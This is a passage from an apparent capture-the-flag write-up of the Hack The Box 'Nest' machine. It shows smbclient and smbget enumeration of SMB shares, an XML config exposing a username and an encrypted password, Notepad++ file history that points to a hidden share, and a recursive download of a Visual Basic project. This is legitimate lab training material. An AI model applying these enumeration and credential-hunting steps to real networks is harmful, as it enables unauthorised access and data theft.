htb/boxes/Nest </span><br><span class="line">‚ùØ <span class="built_in">cd</span> IT/Configs/</span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> Nest/IT/Configs </span><br><span class="line">‚ùØ ls</span><br><span class="line"> Adobe   Atlas   DLink   Microsoft   NotepadPlusPlus  <span class="string">'RU Scanner'</span>  <span class="string">'Server Manager'</span></span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> Nest/IT/Configs </span><br><span class="line">‚ùØ <span class="built_in">cd</span> <span class="string">'RU Scanner'</span>/</span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> IT/Configs/RU Scanner </span><br><span class="line">‚ùØ ls</span><br><span class="line">RU_config.xml</span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> IT/Configs/RU Scanner </span><br><span class="line">‚ùØ</span><br></pre></td></tr></table></figure><p>and this the content of <code>xml</code> file I got :</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> IT/Configs/RU Scanner </span><br><span class="line">‚ùØ cat RU_config.xml </span><br><span class="line">&lt;?xml version=<span class="string">"1.0"</span>?&gt;</span><br><span class="line">&lt;ConfigFile xmlns:xsi=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span> xmlns:xsd=<span class="string">"http://www.w3.org/2001/XMLSchema"</span>&gt;</span><br><span class="line">  &lt;Port&gt;389&lt;/Port&gt;</span><br><span class="line">  &lt;Username&gt;c.smith&lt;/Username&gt;</span><br><span class="line">  &lt;Password&gt;fTEzAfYDoz1YzkqhQkH6GQFYKp1XY5hm7bjOP86yYxE=&lt;/Password&gt;</span><br><span class="line">&lt;/ConfigFile&gt;</span><br><span class="line">root <span class="keyword">in</span> IT/Configs/RU Scanner </span><br><span class="line">‚ùØ</span><br></pre></td></tr></table></figure><p>I thought I would use it to try authenticating to the <code>SMB shares</code> but its Authenticaition failed, So i think the password is encrypted‚Äô leading me to suspect that the password needs to be decrypted.</p><p>Next the <code>config.xml</code></p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> IT/Configs/NotepadPlusPlus </span><br><span class="line">‚ùØ cat config.xml </span><br><span class="line">&lt;?xml version=<span class="string">"1.0"</span> encoding=<span class="string">"Windows-1252"</span> ?&gt;</span><br><span class="line">&lt;NotepadPlus&gt;</span><br><span class="line">    &lt;GUIConfigs&gt;</span><br><span class="line">        &lt;!-- 3 status : <span class="string">"large"</span>, <span class="string">"small"</span> or <span class="string">"hide"</span>--&gt;</span><br><span class="line">        &lt;GUIConfig name=<span class="string">"ToolBar"</span> visible=<span class="string">"yes"</span>&gt;standard&lt;/GUIConfig&gt;</span><br><span class="line">        &lt;!-- 2 status : <span class="string">"show"</span> or <span class="string">"hide"</span>--&gt;</span><br><span class="line">        &lt;GUIConfig name=<span class="string">"StatusBar"</span>&gt;show&lt;/GUIConfig&gt;</span><br><span class="line">        &lt;!-- For all attributs, 2 status : <span class="string">"yes"</span> or <span class="string">"no"</span>--&gt;</span><br><span class="line">        &lt;GUIConfig name=<span class="string">"TabBar"</span> dragAndDrop=<span class="string">"yes"</span> drawTopBar=<span class="string">"yes"</span> drawInactiveTab=<span class="string">"yes"</span> reduce=<span class="string">"yes"</span> closeButton=<span class="string">"no"</span> doubleClick2Close=<span class="string">"no"</span> vertical=<span class="string">"no"</span> multiLine=<span class="string">"no"</span> hide=<span class="string">"no"</span> /&gt;</span><br><span class="line">        &lt;!-- 2 positions : <span class="string">"horizontal"</span> or <span class="string">"vertical"</span>--&gt;</span><br><span class="line">        &lt;GUIConfig name=<span class="string">"ScintillaViewsSplitter"</span>&gt;vertical&lt;/GUIConfig&gt;</span><br><span class="line">        &lt;!-- For the attribut of position, 2 status : docked or undocked ; 2 status : <span class="string">"show"</span> or <span class="string">"hide"</span> --&gt;</span><br><span class="line">        &lt;GUIConfig name=<span class="string">"UserDefineDlg"</span> position=<span class="string">"undocked"</span>&gt;hide&lt;/GUIConfig&gt;</span><br><span class="line">        &lt;GUIConfig name=<span class="string">"TabSetting"</span> size=<span class="string">"4"</span> replaceBySpace=<span class="string">"no"</span> /&gt;</span><br><span class="line">        &lt;!--App position--&gt;</span><br><span class="line">        &lt;GUIConfig name=<span class="string">"AppPosition"</span> x=<span class="string">"662"</span> y=<span class="string">"95"</span> width=<span class="string">"955"</span> height=<span class="string">"659"</span> isMaximized=<span class="string">"yes"</span> /&gt;</span><br><span class="line">        &lt;!-- For the primary scintilla view,</span><br><span class="line">             2 status <span class="keyword">for</span> Attribut lineNumberMargin, bookMarkMargin, indentGuideLine and currentLineHilitingShow: <span class="string">"show"</span> or <span class="string">"hide"</span></span><br><span class="line">             4 status <span class="keyword">for</span> Attribut folderMarkStyle : <span class="string">"simple"</span>, <span class="string">"arrow"</span>, <span class="string">"circle"</span> and <span class="string">"box"</span>  --&gt;</span><br><span class="line">        &lt;GUIConfig name=<span class="string">"ScintillaPrimaryView"</span> lineNumberMargin=<span class="string">"show"</span> bookMarkMargin=<span class="string">"show"</span> folderMarkStyle=<span class="string">"box"</span> indentGuideLine=<span class="string">"show"</span> currentLineHilitingShow=<span class="string">"show"</span> Wrap=<span class="string">"yes"</span> edge=<span class="string">"no"</span> edgeNbColumn=<span class="string">"100"</span> wrapSymbolShow=<span class="string">"hide"</span> zoom=<span class="string">"0"</span> whiteSpaceShow=<span class="string">"hide"</span> eolShow=<span class="string">"hide"</span> lineWrapMethod=<span class="string">"aligned"</span> zoom2=<span class="string">"0"</span> /&gt;</span><br><span class="line">        &lt;!-- For the secodary scintilla view,</span><br><span class="line">             2 status <span class="keyword">for</span> Attribut lineNumberMargin, bookMarkMargin, indentGuideLine and currentLineHilitingShow: <span class="string">"show"</span> or <span class="string">"hide"</span></span><br><span class="line">             4 status <span class="keyword">for</span> Attribut folderMarkStyle : <span class="string">"simple"</span>, <span class="string">"arrow"</span>, <span class="string">"circle"</span> and <span class="string">"box"</span> --&gt;</span><br><span class="line">        &lt;GUIConfig name=<span class="string">"Auto-detection"</span>&gt;yes&lt;/GUIConfig&gt;</span><br><span class="line">        &lt;GUIConfig name=<span class="string">"CheckHistoryFiles"</span>&gt;no&lt;/GUIConfig&gt;</span><br><span class="line">        &lt;GUIConfig name=<span class="string">"TrayIcon"</span>&gt;no&lt;/GUIConfig&gt;</span><br><span class="line">        &lt;GUIConfig name=<span class="string">"RememberLastSession"</span>&gt;yes&lt;/GUIConfig&gt;</span><br><span class="line">        &lt;!--</span><br><span class="line">                        New Document default settings :</span><br><span class="line">                                format = 0/1/2 -&gt; win/unix/mac</span><br><span class="line">                                encoding = 0/1/2/3/4/5 -&gt; ANSI/UCS2Big/UCS2small/UTF8/UTF8-BOM</span><br><span class="line">                                defaultLang = 0/1/2/..</span><br><span class="line"></span><br><span class="line">                        Note 1 : UTF8-BOM -&gt; UTF8 without BOM</span><br><span class="line">                        Note 2 : <span class="keyword">for</span> defaultLang :</span><br><span class="line">                                        0 -&gt; L_TXT</span><br><span class="line">                                        1 -&gt; L_PHP</span><br><span class="line">                                        ... (see <span class="built_in">source</span> file)</span><br><span class="line">                --&gt;</span><br><span class="line">        &lt;GUIConfig name=<span class="string">"NewDocDefaultSettings"</span> format=<span class="string">"0"</span> encoding=<span class="string">"0"</span> lang=<span class="string">"0"</span> codepage=<span class="string">"-1"</span> openAnsiAsUTF8=<span class="string">"no"</span> /&gt;</span><br><span class="line">        &lt;GUIConfig name=<span class="string">"langsExcluded"</span> gr0=<span class="string">"0"</span> gr1=<span class="string">"0"</span> gr2=<span class="string">"0"</span> gr3=<span class="string">"0"</span> gr4=<span class="string">"0"</span> gr5=<span class="string">"0"</span> gr6=<span class="string">"0"</span> gr7=<span class="string">"0"</span> langMenuCompact=<span class="string">"yes"</span> /&gt;</span><br><span class="line">        &lt;!--</span><br><span class="line">                printOption is <span class="built_in">print</span> colour setting, the following values are possible :</span><br><span class="line">                        0 : WYSIWYG</span><br><span class="line">                        1 : Invert colour</span><br><span class="line">                        2 : B &amp; W</span><br><span class="line">                        3 : WYSIWYG but without background colour</span><br><span class="line">                --&gt;</span><br><span class="line">        &lt;GUIConfig name=<span class="string">"Print"</span> lineNumber=<span class="string">"no"</span> printOption=<span class="string">"0"</span> headerLeft=<span class="string">"<span class="variable">$(FULL_CURRENT_PATH)</span>"</span> headerMiddle=<span class="string">""</span> headerRight=<span class="string">"<span class="variable">$(LONG_DATE)</span> <span class="variable">$(TIME)</span>"</span> headerFontName=<span class="string">"IBMPC"</span> headerFontStyle=<span class="string">"1"</span> headerFontSize=<span class="string">"8"</span> footerLeft=<span class="string">""</span> footerMiddle=<span class="string">"-<span class="variable">$(CURRENT_PRINTING_PAGE)</span>-"</span> footerRight=<span class="string">""</span> footerFontName=<span class="string">""</span> footerFontStyle=<span class="string">"0"</span> footerFontSize=<span class="string">"9"</span> margeLeft=<span class="string">"0"</span> margeTop=<span class="string">"0"</span> margeRight=<span class="string">"0"</span> margeBottom=<span class="string">"0"</span> /&gt;</span><br><span class="line">        &lt;!--</span><br><span class="line">                            Backup Setting :</span><br><span class="line">                                0 : non backup</span><br><span class="line">                                1 : simple backup</span><br><span class="line">                                2 : verbose backup</span><br><span class="line">                      --&gt;</span><br><span class="line">        &lt;GUIConfig name=<span class="string">"Backup"</span> action=<span class="string">"0"</span> useCustumDir=<span class="string">"no"</span> dir=<span class="string">""</span> /&gt;</span><br><span class="line">        &lt;GUIConfig name=<span class="string">"TaskList"</span>&gt;yes&lt;/GUIConfig&gt;</span><br><span class="line">        &lt;GUIConfig name=<span class="string">"SaveOpenFileInSameDir"</span>&gt;no&lt;/GUIConfig&gt;</span><br><span class="line">        &lt;GUIConfig name=<span class="string">"noUpdate"</span> intervalDays=<span class="string">"15"</span> nextUpdateDate=<span class="string">"20080426"</span>&gt;no&lt;/GUIConfig&gt;</span><br><span class="line">        &lt;GUIConfig name=<span class="string">"MaitainIndent"</span>&gt;yes&lt;/GUIConfig&gt;</span><br><span class="line">        &lt;GUIConfig name=<span class="string">"MRU"</span>&gt;yes&lt;/GUIConfig&gt;</span><br><span class="line">        &lt;GUIConfig name=<span class="string">"URL"</span>&gt;0&lt;/GUIConfig&gt;</span><br><span class="line">        &lt;GUIConfig name=<span class="string">"globalOverride"</span> <span class="built_in">fg</span>=<span class="string">"no"</span> <span class="built_in">bg</span>=<span class="string">"no"</span> font=<span class="string">"no"</span> fontSize=<span class="string">"no"</span> bold=<span class="string">"no"</span> italic=<span class="string">"no"</span> underline=<span class="string">"no"</span> /&gt;</span><br><span class="line">        &lt;GUIConfig name=<span class="string">"auto-completion"</span> autoCAction=<span class="string">"0"</span> triggerFromNbChar=<span class="string">"1"</span> funcParams=<span class="string">"no"</span> /&gt;</span><br><span class="line">        &lt;GUIConfig name=<span class="string">"sessionExt"</span>&gt;&lt;/GUIConfig&gt;</span><br><span class="line">        &lt;GUIConfig name=<span class="string">"SmartHighLight"</span>&gt;yes&lt;/GUIConfig&gt;</span><br><span class="line">        &lt;GUIConfig name=<span class="string">"TagsMatchHighLight"</span> TagAttrHighLight=<span class="string">"yes"</span> HighLightNonHtmlZone=<span class="string">"no"</span>&gt;yes&lt;/GUIConfig&gt;</span><br><span class="line">        &lt;GUIConfig name=<span class="string">"MenuBar"</span>&gt;show&lt;/GUIConfig&gt;</span><br><span class="line">        &lt;GUIConfig name=<span class="string">"Caret"</span> width=<span class="string">"1"</span> blinkRate=<span class="string">"250"</span> /&gt;</span><br><span class="line">        &lt;GUIConfig name=<span class="string">"ScintillaGlobalSettings"</span> enableMultiSelection=<span class="string">"no"</span> /&gt;</span><br><span class="line">        &lt;GUIConfig name=<span class="string">"openSaveDir"</span> value=<span class="string">"0"</span> defaultDirPath=<span class="string">""</span> /&gt;</span><br><span class="line">        &lt;GUIConfig name=<span class="string">"titleBar"</span> short=<span class="string">"no"</span> /&gt;</span><br><span class="line">        &lt;GUIConfig name=<span class="string">"DockingManager"</span> leftWidth=<span class="string">"200"</span> rightWidth=<span class="string">"200"</span> topHeight=<span class="string">"200"</span> bottomHeight=<span class="string">"266"</span>&gt;</span><br><span class="line">            &lt;FloatingWindow cont=<span class="string">"4"</span> x=<span class="string">"39"</span> y=<span class="string">"109"</span> width=<span class="string">"531"</span> height=<span class="string">"364"</span> /&gt;</span><br><span class="line">            &lt;PluginDlg pluginName=<span class="string">"dummy"</span> id=<span class="string">"0"</span> curr=<span class="string">"3"</span> prev=<span class="string">"-1"</span> isVisible=<span class="string">"yes"</span> /&gt;</span><br><span class="line">            &lt;PluginDlg pluginName=<span class="string">"NppConverter.dll"</span> id=<span class="string">"3"</span> curr=<span class="string">"4"</span> prev=<span class="string">"0"</span> isVisible=<span class="string">"no"</span> /&gt;</span><br><span class="line">            &lt;ActiveTabs cont=<span class="string">"0"</span> activeTab=<span class="string">"-1"</span> /&gt;</span><br><span class="line">            &lt;ActiveTabs cont=<span class="string">"1"</span> activeTab=<span class="string">"-1"</span> /&gt;</span><br><span class="line">            &lt;ActiveTabs cont=<span class="string">"2"</span> activeTab=<span class="string">"-1"</span> /&gt;</span><br><span class="line">            &lt;ActiveTabs cont=<span class="string">"3"</span> activeTab=<span class="string">"-1"</span> /&gt;</span><br><span class="line">        &lt;/GUIConfig&gt;</span><br><span class="line">    &lt;/GUIConfigs&gt;</span><br><span class="line">    &lt;!-- The History of opened files list --&gt;</span><br><span class="line">    &lt;FindHistory nbMaxFindHistoryPath=<span class="string">"10"</span> nbMaxFindHistoryFilter=<span class="string">"10"</span> nbMaxFindHistoryFind=<span class="string">"10"</span> nbMaxFindHistoryReplace=<span class="string">"10"</span> matchWord=<span class="string">"no"</span> matchCase=<span class="string">"no"</span> wrap=<span class="string">"yes"</span> directionDown=<span class="string">"yes"</span> fifRecuisive=<span class="string">"yes"</span> fifInHiddenFolder=<span class="string">"no"</span> dlgAlwaysVisible=<span class="string">"no"</span> fifFilterFollowsDoc=<span class="string">"no"</span> fifFolderFollowsDoc=<span class="string">"no"</span> searchMode=<span class="string">"0"</span> transparencyMode=<span class="string">"0"</span> transparency=<span class="string">"150"</span>&gt;</span><br><span class="line">        &lt;Find name=<span class="string">"text"</span> /&gt;</span><br><span class="line">        &lt;Find name=<span class="string">"txt"</span> /&gt;</span><br><span class="line">        &lt;Find name=<span class="string">"itx"</span> /&gt;</span><br><span class="line">        &lt;Find name=<span class="string">"iTe"</span> /&gt;</span><br><span class="line">        &lt;Find name=<span class="string">"IEND"</span> /&gt;</span><br><span class="line">        &lt;Find name=<span class="string">"redeem"</span> /&gt;</span><br><span class="line">        &lt;Find name=<span class="string">"activa"</span> /&gt;</span><br><span class="line">        &lt;Find name=<span class="string">"activate"</span> /&gt;</span><br><span class="line">        &lt;Find name=<span class="string">"redeem on"</span> /&gt;</span><br><span class="line">        &lt;Find name=<span class="string">"192"</span> /&gt;</span><br><span class="line">        &lt;Replace name=<span class="string">"C_addEvent"</span> /&gt;</span><br><span class="line">    &lt;/FindHistory&gt;</span><br><span class="line">    &lt;History nbMaxFile=<span class="string">"15"</span> inSubMenu=<span class="string">"no"</span> customLength=<span class="string">"-1"</span>&gt;</span><br><span class="line">        &lt;File filename=<span class="string">"C:\windows\System32\drivers\etc\hosts"</span> /&gt;</span><br><span class="line">        &lt;File filename=<span class="string">"\\HTB-NEST\Secure$\IT\Carl\Temp.txt"</span> /&gt;</span><br><span class="line">        &lt;File filename=<span class="string">"C:\Users\C.Smith\Desktop\todo.txt"</span> /&gt;</span><br><span class="line">    &lt;/History&gt;</span><br><span class="line">&lt;/NotepadPlus&gt;</span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> IT/Configs/NotepadPlusPlus </span><br><span class="line">‚ùØ</span><br></pre></td></tr></table></figure><p>Looking at the very bottom of <code>config.xml</code> I see another interesting stuff. Someone was accessing files on the <code>Secure$</code> share as well as files on the <code>C.Smith</code> user‚Äôs desktop.</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">&lt;History nbMaxFile=<span class="string">"15"</span> inSubMenu=<span class="string">"no"</span> customLength=<span class="string">"-1"</span>&gt;</span><br><span class="line">    &lt;File filename=<span class="string">"C:\windows\System32\drivers\etc\hosts"</span> /&gt;</span><br><span class="line">    &lt;File filename=<span class="string">"\\HTB-NEST\Secure$\IT\Carl\Temp.txt"</span> /&gt;</span><br><span class="line">    &lt;File filename=<span class="string">"C:\Users\C.Smith\Desktop\todo.txt"</span> /&gt;</span><br><span class="line">&lt;/History&gt;</span><br></pre></td></tr></table></figure><hr><h2 id="Post-Exploitation"><a href="#Post-Exploitation" class="headerlink" title="Post Exploitation"></a>Post Exploitation</h2><h3 id="Enumerate-TempUser"><a href="#Enumerate-TempUser" class="headerlink" title="Enumerate TempUser"></a>Enumerate TempUser</h3><p>so let‚Äôs see if we can access anything in this share as <code>TempUser</code> :</p><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="meta"># bash</span></span><br><span class="line"></span><br><span class="line">‚ùØ smbclient  \\\\<span class="number">10.10</span><span class="number">.10</span><span class="number">.178</span>\\Secure$ -U TempUser</span><br><span class="line">smb: \&gt; recurse <span class="keyword">on</span></span><br><span class="line">smb: \&gt; ls</span><br><span class="line">  .                                   D        <span class="number">0</span>  Wed Aug  <span class="number">7</span> <span class="number">19</span>:<span class="number">08</span>:<span class="number">12</span> <span class="number">2019</span></span><br><span class="line">  ..                                  D        <span class="number">0</span>  Wed Aug  <span class="number">7</span> <span class="number">19</span>:<span class="number">08</span>:<span class="number">12</span> <span class="number">2019</span></span><br><span class="line">  Finance                             D        <span class="number">0</span>  Wed Aug  <span class="number">7</span> <span class="number">15</span>:<span class="number">40</span>:<span class="number">13</span> <span class="number">2019</span></span><br><span class="line">  HR                                  D        <span class="number">0</span>  Wed Aug  <span class="number">7</span> <span class="number">19</span>:<span class="number">08</span>:<span class="number">11</span> <span class="number">2019</span></span><br><span class="line">  IT                                  D        <span class="number">0</span>  Thu Aug  <span class="number">8</span> <span class="number">06</span>:<span class="number">59</span>:<span class="number">25</span> <span class="number">2019</span></span><br><span class="line">\Finance</span><br><span class="line">NT_STATUS_ACCESS_DENIED listing \Finance\*</span><br><span class="line">\HR</span><br><span class="line">NT_STATUS_ACCESS_DENIED listing \HR\*</span><br><span class="line">\IT</span><br><span class="line">NT_STATUS_ACCESS_DENIED listing \IT\*</span><br><span class="line"></span><br><span class="line">smb: \&gt;</span><br></pre></td></tr></table></figure><p>Interesting; it seems that the TempUser doesn‚Äôt have any access to listing the 3 directories. but ultimately I found that the IT\Carl\ folder was indeed listable:</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/Nest </span><br><span class="line">‚ùØ smbclient  \\\\10.10.10.178\\Secure$ -U TempUser</span><br><span class="line">Enter WORKGROUP\TempUser<span class="string">'s password: </span></span><br><span class="line"><span class="string">Try "help" to get a list of possible commands.</span></span><br><span class="line"><span class="string">smb: \&gt; cd IT/Carl</span></span><br><span class="line"><span class="string">smb: \IT\Carl\&gt; recurse on</span></span><br><span class="line"><span class="string">smb: \IT\Carl\&gt; ls</span></span><br><span class="line"><span class="string">  .                                   D        0  Thu Aug  8 03:42:14 2019</span></span><br><span class="line"><span class="string">  ..                                  D        0  Thu Aug  8 03:42:14 2019</span></span><br><span class="line"><span class="string">  Docs                                D        0  Thu Aug  8 03:44:00 2019</span></span><br><span class="line"><span class="string">  Reports                             D        0  Tue Aug  6 21:45:40 2019</span></span><br><span class="line"><span class="string">  VB Projects                         D        0  Tue Aug  6 22:41:55 2019</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">\IT\Carl\Docs</span></span><br><span class="line"><span class="string">  .                                   D        0  Thu Aug  8 03:44:00 2019</span></span><br><span class="line"><span class="string">  ..                                  D        0  Thu Aug  8 03:44:00 2019</span></span><br><span class="line"><span class="string">  ip.txt                              A       56  Thu Aug  8 03:44:16 2019</span></span><br><span class="line"><span class="string">  mmc.txt                             A       73  Thu Aug  8 03:43:42 2019</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">\IT\Carl\Reports</span></span><br><span class="line"><span class="string">  .                                   D        0  Tue Aug  6 21:45:40 2019</span></span><br><span class="line"><span class="string">  ..                                  D        0  Tue Aug  6 21:45:40 2019</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">\IT\Carl\VB Projects</span></span><br><span class="line"><span class="string">  .                                   D        0  Tue Aug  6 22:41:55 2019</span></span><br><span class="line"><span class="string">  ..                                  D        0  Tue Aug  6 22:41:55 2019</span></span><br><span class="line"><span class="string">  Production                          D        0  Tue Aug  6 22:07:13 2019</span></span><br><span class="line"><span class="string">  WIP                                 D        0  Tue Aug  6 22:47:41 2019</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">\IT\Carl\VB Projects\Production</span></span><br><span class="line"><span class="string">  .                                   D        0  Tue Aug  6 22:07:13 2019</span></span><br><span class="line"><span class="string">  ..                                  D        0  Tue Aug  6 22:07:13 2019</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">\IT\Carl\VB Projects\WIP</span></span><br><span class="line"><span class="string">  .                                   D        0  Tue Aug  6 22:47:41 2019</span></span><br><span class="line"><span class="string">  ..                                  D        0  Tue Aug  6 22:47:41 2019</span></span><br><span class="line"><span class="string">  RU                                  D        0  Fri Aug  9 23:36:45 2019</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">\IT\Carl\VB Projects\WIP\RU</span></span><br><span class="line"><span class="string">  .                                   D        0  Fri Aug  9 23:36:45 2019</span></span><br><span class="line"><span class="string">  ..                                  D        0  Fri Aug  9 23:36:45 2019</span></span><br><span class="line"><span class="string">  RUScanner                           D        0  Thu Aug  8 06:05:54 2019</span></span><br><span class="line"><span class="string">  RUScanner.sln                       A      871  Tue Aug  6 22:45:36 2019</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">\IT\Carl\VB Projects\WIP\RU\RUScanner</span></span><br><span class="line"><span class="string">  .                                   D        0  Thu Aug  8 06:05:54 2019</span></span><br><span class="line"><span class="string">  ..                                  D        0  Thu Aug  8 06:05:54 2019</span></span><br><span class="line"><span class="string">  bin                                 D        0  Thu Aug  8 04:00:11 2019</span></span><br><span class="line"><span class="string">  ConfigFile.vb                       A      772  Thu Aug  8 06:05:09 2019</span></span><br><span class="line"><span class="string">  Module1.vb                          A      279  Thu Aug  8 06:05:44 2019</span></span><br><span class="line"><span class="string">  My Project                          D        0  Thu Aug  8 04:00:11 2019</span></span><br><span class="line"><span class="string">  obj                                 D        0  Thu Aug  8 04:00:11 2019</span></span><br><span class="line"><span class="string">  RU Scanner.vbproj                   A     4828  Fri Aug  9 23:37:51 2019</span></span><br><span class="line"><span class="string">  RU Scanner.vbproj.user              A      143  Tue Aug  6 20:55:27 2019</span></span><br><span class="line"><span class="string">  SsoIntegration.vb                   A      133  Thu Aug  8 06:05:58 2019</span></span><br><span class="line"><span class="string">  Utils.vb                            A     4888  Thu Aug  8 03:49:35 2019</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">\IT\Carl\VB Projects\WIP\RU\RUScanner\bin</span></span><br><span class="line"><span class="string">  .                                   D        0  Thu Aug  8 04:00:11 2019</span></span><br><span class="line"><span class="string">  ..                                  D        0  Thu Aug  8 04:00:11 2019</span></span><br><span class="line"><span class="string">  Debug                               D        0  Thu Aug  8 03:59:13 2019</span></span><br><span class="line"><span class="string">  Release                             D        0  Tue Aug  6 20:55:26 2019</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">\IT\Carl\VB Projects\WIP\RU\RUScanner\My Project</span></span><br><span class="line"><span class="string">  .                                   D        0  Thu Aug  8 04:00:11 2019</span></span><br><span class="line"><span class="string">  ..                                  D        0  Thu Aug  8 04:00:11 2019</span></span><br><span class="line"><span class="string">  Application.Designer.vb             A      441  Tue Aug  6 20:55:13 2019</span></span><br><span class="line"><span class="string">  Application.myapp                   A      481  Tue Aug  6 20:55:13 2019</span></span><br><span class="line"><span class="string">  AssemblyInfo.vb                     A     1163  Tue Aug  6 20:55:13 2019</span></span><br><span class="line"><span class="string">  Resources.Designer.vb               A     2776  Tue Aug  6 20:55:13 2019</span></span><br><span class="line"><span class="string">  Resources.resx                      A     5612  Tue Aug  6 20:55:13 2019</span></span><br><span class="line"><span class="string">  Settings.Designer.vb                A     2989  Tue Aug  6 20:55:13 2019</span></span><br><span class="line"><span class="string">  Settings.settings                   A      279  Tue Aug  6 20:55:13 2019</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">\IT\Carl\VB Projects\WIP\RU\RUScanner\obj</span></span><br><span class="line"><span class="string">  .                                   D        0  Thu Aug  8 04:00:11 2019</span></span><br><span class="line"><span class="string">  ..                                  D        0  Thu Aug  8 04:00:11 2019</span></span><br><span class="line"><span class="string">  x86                                 D        0  Thu Aug  8 03:59:18 2019</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">\IT\Carl\VB Projects\WIP\RU\RUScanner\bin\Debug</span></span><br><span class="line"><span class="string">  .                                   D        0  Thu Aug  8 03:59:13 2019</span></span><br><span class="line"><span class="string">  ..                                  D        0  Thu Aug  8 03:59:13 2019</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">\IT\Carl\VB Projects\WIP\RU\RUScanner\bin\Release</span></span><br><span class="line"><span class="string">  .                                   D        0  Tue Aug  6 20:55:26 2019</span></span><br><span class="line"><span class="string">  ..                                  D        0  Tue Aug  6 20:55:26 2019</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">\IT\Carl\VB Projects\WIP\RU\RUScanner\obj\x86</span></span><br><span class="line"><span class="string">  .                                   D        0  Thu Aug  8 03:59:18 2019</span></span><br><span class="line"><span class="string">  ..                                  D        0  Thu Aug  8 03:59:18 2019</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                10485247 blocks of size 4096. 6544137 blocks available</span></span><br><span class="line"><span class="string">smb: \IT\Carl\&gt;</span></span><br></pre></td></tr></table></figure><p>Looks like there is some source code written in <code>Visual Basic</code>. SO I use <code>smbget</code> to recursively download the <code>Secure$\IT\Carl</code> directory for further analysis so :</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/Nest </span><br><span class="line">‚ùØ smbget -rR smb://10.10.10.178/Secure$/IT/Carl/ -U TempUser</span><br><span class="line">Password <span class="keyword">for</span> [TempUser] connecting to //Secure$/10.10.10.178: </span><br><span class="line">Using workgroup WORKGROUP, user TempUser</span><br><span class="line">smb://10.10.10.178/Secure$/IT/Carl//Docs/ip.txt</span><br><span class="line">smb://10.10.10.178/Secure$/IT/Carl//Docs/mmc.txt</span><br><span class="line">smb://10.10.10.178/Secure$/IT/Carl//VB Projects/WIP/RU/RUScanner/ConfigFile.vb</span><br><span class="line">smb://10.10.10.178/Secure$/IT/Carl//VB Projects/WIP/RU/RUScanner/Module1.vb</span><br><span class="line">smb://10.10.10.178/Secure$/IT/Carl//VB Projects/WIP/RU/RUScanner/My Project/Application.Designer.vb</span><br><span class="line">smb://10.10.10.178/Secure$/IT/Carl//VB Projects/WIP/RU/RUScanner/My Project/Application.myapp</span><br><span class="line">smb://10.10.10.178/Secure$/IT/Carl//VB Projects/WIP/RU/RUScanner/My Project/AssemblyInfo.vb</span><br><span class="line">smb://10.10.10.178/Secure$/IT/Carl//VB Projects/WIP/RU/RUScanner/My Project/Resources.Designer.vb</span><br><span class="line">smb://10.10.10.178/Secure$/IT/Carl//VB Projects/WIP/RU/RUScanner/My Project/Resources.resx</span><br><span class="line">smb://10.10.10.178/Secure$/IT/Carl//VB Projects/WIP/RU/RUScanner/My Project/Settings.Designer.vb</span><br><span class="line">smb://10.10.10.178/Secure$/IT/Carl//VB Projects/WIP/RU/RUScanner/My Project/Settings.settings</span><br><span class="line">smb://10.10.10.178/Secure$/IT/Carl//VB Projects/WIP/RU/RUScanner/RU Scanner.vbproj</span><br><span class="line">smb://10.10.10.178/Secure$/IT/Carl//VB Projects/WIP/RU/RUScanner/RU Scanner.vbproj.user</span><br><span class="line">smb://10.10.10.178/Secure$/IT/Carl//VB Projects/WIP/RU/RUScanner/SsoIntegration.vb</span><br><span class="line">smb://10.10.10.178/Secure$/IT/Carl//VB Projects/WIP/RU/RUScanner/Utils.vb</span><br><span class="line">smb://10.10.10.178/Secure$/IT/Carl//VB Projects/WIP/RU/RUScanner.sln</span><br><span class="line">Downloaded 0b <span class="keyword">in</span> 12 seconds</span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/Nest 12s</span><br><span class="line">‚ùØ</span><br></pre></td></tr></table></figure><p>So this is the whole directory I get :</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> WIP/RU/RUScanner </span><br><span class="line">‚ùØ ls</span><br><span class="line"> bin   ConfigFile.vb   Module1.vb  <span class="string">'My Project'</span>   obj  <span class="string">'RU Scanner.vbproj'</span>  <span class="string">'RU Scanner.vbproj.user'</span>   SsoIntegration.vb   Utils.vb</span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> WIP/RU/RUScanner </span><br><span class="line">‚ùØ</span><br></pre></td></tr></table></figure><p>Looking at the <code>.vb</code> file the <code>Module1.vb</code> was responsible for retrieving the password from <code>RU_config.xml</code> 